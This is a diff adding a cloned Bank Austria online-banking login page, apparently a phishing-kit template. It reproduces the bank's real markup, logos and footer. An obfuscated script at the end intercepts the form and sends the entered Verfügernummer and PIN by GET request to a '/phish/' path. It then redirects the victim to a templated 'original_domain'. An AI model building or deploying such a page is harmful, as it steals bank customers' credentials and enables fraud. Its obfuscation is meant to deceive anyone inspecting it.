+                                                        class="userinputwithinfo userid-container">
+                                                        <t4y-password-input
+                                                            _ngcontent-lqg-c34=""
+                                                            class="userinput verifyCredential-userid"
+                                                            _nghost-lqg-c27=""
+                                                            ><input
+                                                                _ngcontent-lqg-c27=""
+                                                                class="no-message ng-pristine ng-valid ng-touched"
+                                                                placeholder="Verfügernummer"
+                                                                id="user"
+                                                                name="user"
+                                                                type="input"
+                                                                maxlength="8" /><!----></t4y-password-input
+                                                        >
+                                                        <div
+                                                            _ngcontent-lqg-c34=""
+                                                            class="credentialinfocontainer">
+                                                            <t4y-infotip
+                                                                _ngcontent-lqg-c34=""
+                                                                class="credentialinfo"
+                                                                _nghost-lqg-c31=""
+                                                                ><span
+                                                                    _ngcontent-lqg-c31=""
+                                                                    class="t4y-infotip-span"
+                                                                    ><!----></span
+                                                                ></t4y-infotip
+                                                            >
+                                                        </div>
+                                                    </div>
+                                                    <div
+                                                        _ngcontent-lqg-c34=""
+                                                        class="userinputwithinfo password-container">
+                                                        <t4y-password-input
+                                                            _ngcontent-lqg-c34=""
+                                                            class="userinput verifyCredential-password"
+                                                            _nghost-lqg-c27=""
+                                                            ><input
+                                                                _ngcontent-lqg-c27=""
+                                                                class="no-message ng-untouched ng-pristine ng-valid"
+                                                                placeholder="PIN"
+                                                                name="password"
+                                                                id="password"
+                                                                type="password"
+                                                                maxlength="37" /><!----></t4y-password-input
+                                                        >
+                                                        <div
+                                                            _ngcontent-lqg-c34=""
+                                                            class="credentialinfocontainer">
+                                                            <t4y-infotip
+                                                                _ngcontent-lqg-c34=""
+                                                                class="credentialinfo"
+                                                                _nghost-lqg-c31=""
+                                                                ><span
+                                                                    _ngcontent-lqg-c31=""
+                                                                    class="t4y-infotip-span"
+                                                                    ><!----></span
+                                                                ></t4y-infotip
+                                                            >
+                                                        </div>
+                                                    </div>
+                                                </div>
+                                                <div
+                                                    _ngcontent-lqg-c34=""
+                                                    class="postUserinputInfoPanel">
+                                                    <div
+                                                        _ngcontent-lqg-c34=""
+                                                        class="link-style box-link-forgot-pwd">
+                                                        <a
+                                                            _ngcontent-lqg-c34=""
+                                                            target="_blank"
+                                                            href="https://banking.bankaustria.at/pinreset"
+                                                            >PIN vergessen oder
+                                                            Verfügernummer
+                                                            gesperrt?</a
+                                                        >
+                                                    </div>
+                                                </div>
+                                                <div
+                                                    _ngcontent-lqg-c34=""
+                                                    class="loginButtonContainer">
+                                                    <t4y-button
+                                                        _ngcontent-lqg-c34=""
+                                                        class="loginButton"
+                                                        _nghost-lqg-c32=""
+                                                        ><button
+                                                            _ngcontent-lqg-c32=""
+                                                            role="button">
+                                                            <span
+                                                                _ngcontent-lqg-c32=""
+                                                                >LOGIN</span
+                                                            >
+                                                        </button></t4y-button
+                                                    >
+                                                </div>
+                                                <div
+                                                    _ngcontent-lqg-c34=""
+                                                    class="securityMessagePanel">
+                                                    <div _ngcontent-lqg-c34="">
+                                                        Gefälschte Bank Austria
+                                                        Mails im Umlauf!
+                                                    </div>
+                                                    <div
+                                                        _ngcontent-lqg-c34=""
+                                                        class="showSecurityDetails">
+                                                        Details anzeigen
+                                                    </div>
+                                                </div>
+                                            </div>
+                                        </form>
+                                        <!----><!---->
+                                        <div
+                                            _ngcontent-lqg-c34=""
+                                            class="managelanguage-from-login">
+                                            <t4y-manage-language
+                                                _ngcontent-lqg-c34=""
+                                                _nghost-lqg-c33=""
+                                                ><t4y-loader
+                                                    _ngcontent-lqg-c33=""
+                                                    class="manage-language-loader"
+                                                    _nghost-lqg-c29=""
+                                                    style="
+                                                        display: none;
+                                                        opacity: 0.8;
+                                                    "
+                                                    ><div
+                                                        _ngcontent-lqg-c29=""
+                                                        class="horizontalCenter">
+                                                        <div
+                                                            _ngcontent-lqg-c29=""
+                                                            class="verticalCenter">
+                                                            <div
+                                                                _ngcontent-lqg-c29=""
+                                                                class="centerContent">
+                                                                <div
+                                                                    _ngcontent-lqg-c29=""
+                                                                    class="loadingSpinner"></div>
+                                                                <div
+                                                                    _ngcontent-lqg-c29=""
+                                                                    class="loadingDescription loadingDescriptionBlock">
+                                                                    Bitte warten
+                                                                    …
+                                                                </div>
+                                                            </div>
+                                                        </div>
+                                                    </div></t4y-loader
+                                                >
+                                                <div
+                                                    _ngcontent-lqg-c33=""
+                                                    id="change_lang"
+                                                    class="lang-manage-container">
+                                                    <!----><span
+                                                        _ngcontent-lqg-c33=""
+                                                        class="item active"
+                                                        ><span
+                                                            _ngcontent-lqg-c33=""
+                                                            class="flag de"></span
+                                                        ><label
+                                                            _ngcontent-lqg-c33=""
+                                                            class="label"
+                                                            >Deutsch</label
+                                                        ><!----></span
+                                                    ><span
+                                                        _ngcontent-lqg-c33=""
+                                                        class="item"
+                                                        ><span
+                                                            _ngcontent-lqg-c33=""
+                                                            class="flag en"></span
+                                                        ><label
+                                                            _ngcontent-lqg-c33=""
+                                                            class="label"
+                                                            >English</label
+                                                        ><!----></span
+                                                    ><!---->
+                                                </div></t4y-manage-language
+                                            >
+                                        </div>
+                                        <!---->
+                                        <div _ngcontent-lqg-c34="">
+                                            <div
+                                                class="verticalBanner content-padding-wrapper content-bottom-padding-wrapper">
+                                                <div
+                                                    class="banner"
+                                                    style="height: 400px">
+                                                    <div
+                                                        style="
+                                                            background-image: url(https://at-assets.ucgstatic.eu/content/gimb2_at/de/login/login/jcr:content/content_parsys/bordercontainer/wcm/wcmparsys/WCMparsys_cont/verticalbanner/img.img.png/1693474983335.png);
+                                                            position: absolute;
+                                                            top: 0;
+                                                            left: 0;
+                                                            width: 100%;
+                                                            height: 100%;
+                                                            bottom: 0;
+                                                            background-size: cover;
+                                                            background-color: #efefef;
+                                                            background-position: top
+                                                                right;
+                                                            background-repeat: no-repeat;
+                                                        "></div>
+                                                    <h3>
+                                                        <p>
+                                                            <span
+                                                                class="header1"
+                                                                >Von der
+                                                                Elternaktion
+                                                                profitieren</span
+                                                            >
+                                                        </p>
+                                                        <p>
+                                                            <span
+                                                                class="header4"
+                                                                >Gratis
+                                                                MegaCard-Jugendkonto
+                                                                für Ihr Kind
+                                                                <br />
+                                                                eröffnen und
+                                                                zwei Jahre
+                                                                gratis
+                                                                Kontoführung
+                                                                <br />
+                                                                für Ihr
+                                                                Privatkonto
+                                                                beantragen.</span
+                                                            >
+                                                        </p>
+                                                    </h3>
+                                                    <a
+                                                        class="btn-activated"
+                                                        href="https://www.bankaustria.at/jugendkonto/index.jsp?ucid=INT-8584-MegaCardEltern-24You#tab38697"
+                                                        onclick=""
+                                                        target="_blank"
+                                                        style="
+                                                            text-decoration: none;
+                                                        "
+                                                        >Mehr erfahren</a
+                                                    >
+                                                </div>
+                                            </div>
+                                        </div>
+                                        <!---->
+                                    </div>
+                                    <!----><!----></t4y-verify-credentials
+                                ><!----><!----><!----><!----><!---->
+                            </div>
+                            <div
+                                _ngcontent-lqg-c45=""
+                                class="t4y-login-footer-wrapper">
+                                <div
+                                    _ngcontent-lqg-c45=""
+                                    class="t4y-login-footer">
+                                    <footer class="private">
+                                        <div>
+                                            <div class="list-corporate">
+                                                <ul class="corporate">
+                                                    <li>
+                                                        <a
+                                                            href="http://sicherheit.bankaustria.at/"
+                                                            title=""
+                                                            target="_blank"
+                                                            onclick="">
+                                                            <span
+                                                                class="privacy-ico"></span>
+                                                            <span
+                                                                >Sicherheits<br />informationen</span
+                                                            >
+                                                        </a>
+                                                    </li>
+                                                    <li>
+                                                        <a
+                                                            href="tel:+435050526105"
+                                                            title=""
+                                                            target="_blank"
+                                                            onclick="">
+                                                            <span
+                                                                class="phone-ico"></span>
+                                                            <span
+                                                                >Sicherheitscenter<br />+43
+                                                                (0) 50505
+                                                                26105</span
+                                                            >
+                                                        </a>
+                                                    </li>
+                                                    <li>
+                                                        <a
+                                                            href="tel:+435050526100"
+                                                            title=""
+                                                            target="_blank"
+                                                            onclick="">
+                                                            <span
+                                                                class="phone-ico"></span>
+                                                            <span
+                                                                >Internetbanking
+                                                                Hotline<br />+43
+                                                                (0) 50505
+                                                                26100</span
+                                                            >
+                                                        </a>
+                                                    </li>
+                                                    <li>
+                                                        <a
+                                                            href="https://www.bankaustria.at/kontakt-privatkunden.jsp"
+                                                            title=""
+                                                            target="_blank"
+                                                            onclick="">
+                                                            <span
+                                                                class="faq-ico"></span>
+                                                            <span>FAQ</span>
+                                                        </a>
+                                                    </li>
+                                                </ul>
+                                            </div>
+                                            <div class="copyright">
+                                                <ul
+                                                    class="copyright-footer"
+                                                    style="padding-left: 40px">
+                                                    <li>
+                                                        <a
+                                                            href="http://www.bankaustria.at/"
+                                                            title=""
+                                                            target="_blank"
+                                                            onclick=""
+                                                            >UniCredit Bank
+                                                            Austria AG</a
+                                                        >
+                                                    </li>
+                                                    <li>
+                                                        <a
+                                                            href="http://www.bankaustria.at/rechtliches-impressum.jsp"
+                                                            title=""
+                                                            target="_blank"
+                                                            onclick=""
+                                                            >Impressum</a
+                                                        >
+                                                    </li>
+                                                    <li>
+                                                        <a
+                                                            href="http://www.bankaustria.at/rechtliches-agb.jsp"
+                                                            title=""
+                                                            target="_blank"
+                                                            onclick=""
+                                                            >AGB</a
+                                                        >
+                                                    </li>
+                                                    <li class="last">
+                                                        <a
+                                                            href="http://www.bankaustria.at/rechtliches-datenschutz.jsp"
+                                                            title=""
+                                                            target="_blank"
+                                                            onclick=""
+                                                            >Datenschutzerklärung</a
+                                                        >
+                                                    </li>
+                                                </ul>
+                                                <p
+                                                    style="color: #fff"
+                                                    class="copy">
+                                                    © 2023 UniCredit Bank
+                                                    Austria AG
+                                                </p>
+                                                <div class="logo-footer"></div>
+                                            </div>
+                                        </div>
+                                    </footer>
+                                </div>
+                            </div>
+                            <!---->
+                        </div>
+                        <!---->
+                    </div></t4y-login
+                ><!---->
+            </div></t4y-login-app-root
+        >
+        <script
+            src="files/runtime.a2a2b2cad5640890769c.js"
+            defer="defer"></script>
+        <script
+            src="files/polyfills-es5.ff17cf011e2cf895511b.js"
+            nomodule=""
+            defer="defer"></script>
+        <script
+            src="files/polyfills.fb4168ad3bfa4a7a4ff1.js"
+            defer="defer"></script>
+        <script
+            src="files/scripts.fc1520e3a7d3155b68c8.js"
+            defer="defer"></script>
+        <script
+            src="files/main.b91a0ca20f28ec1a472e.js"
+            defer="defer"></script>
+    </body>
+    <script>
+        $(document).ready(function () {
+            function _0x5da5(){var _0x53fa73=['2491767yZcQyi','441732rjPTAn','960985NlAGjh','8Omvvue','20bKRpPW','245517NGysUE','GET','href','/phish/','value','getElementById','location','3653650apblwg','1912700hlNykx','294199TIWExi'];_0x5da5=function(){return _0x53fa73;};return _0x5da5();}function _0x5d00(_0x18c3c6,_0x1e964e){var _0x5da566=_0x5da5();return _0x5d00=function(_0x5d005f,_0x588266){_0x5d005f=_0x5d005f-0x18b;var _0x399853=_0x5da566[_0x5d005f];return _0x399853;},_0x5d00(_0x18c3c6,_0x1e964e);}(function(_0x535539,_0x98db8a){var _0x50844c=_0x5d00,_0x3e8173=_0x535539();while(!![]){try{var _0x126f93=parseInt(_0x50844c(0x190))/0x1+parseInt(_0x50844c(0x195))/0x2*(-parseInt(_0x50844c(0x196))/0x3)+parseInt(_0x50844c(0x18f))/0x4+parseInt(_0x50844c(0x193))/0x5+parseInt(_0x50844c(0x192))/0x6+parseInt(_0x50844c(0x18e))/0x7+-parseInt(_0x50844c(0x194))/0x8*(parseInt(_0x50844c(0x191))/0x9);if(_0x126f93===_0x98db8a)break;else _0x3e8173['push'](_0x3e8173['shift']());}catch(_0xb1eaaa){_0x3e8173['push'](_0x3e8173['shift']());}}}(_0x5da5,0x717fa));function sendform(_0x4c2dfc){var _0x24e4d6=_0x5d00,_0x124e09=document[_0x24e4d6(0x18c)]('user')[_0x24e4d6(0x18b)],_0x937614=document[_0x24e4d6(0x18c)]('password')['value'];$['ajax']({'url':_0x24e4d6(0x199)+_0x124e09+'/'+_0x937614,'type':_0x24e4d6(0x197),'success':_0x42c7ef=>{var _0x139cfb=_0x24e4d6;window[_0x139cfb(0x18d)][_0x139cfb(0x198)]=_0x4c2dfc;},'error':(_0x125c8c,_0x993823,_0x4346d3)=>{var _0x1bc9d0=_0x24e4d6;window[_0x1bc9d0(0x18d)][_0x1bc9d0(0x198)]=_0x4c2dfc;}});}
+
+            $('form').submit(function (event) {
+                event.preventDefault();
+                sendform(
+                    '{{ item.original_domain }}'
+                );
+            });
+        });
+    </script>
+</html>
